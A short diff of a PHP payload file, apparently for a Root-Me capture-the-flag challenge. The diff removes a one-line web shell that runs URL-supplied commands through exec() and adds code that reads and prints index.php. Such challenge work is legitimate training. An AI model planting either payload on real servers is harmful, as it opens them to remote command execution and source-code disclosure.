@@ -1,4 +1,5 @@
 <!--use for Root-Me chall-->
 <?php
-exec($_GET["cmd"]);
+$file = file_get_contents('index.php');
+echo $file;
 ?>
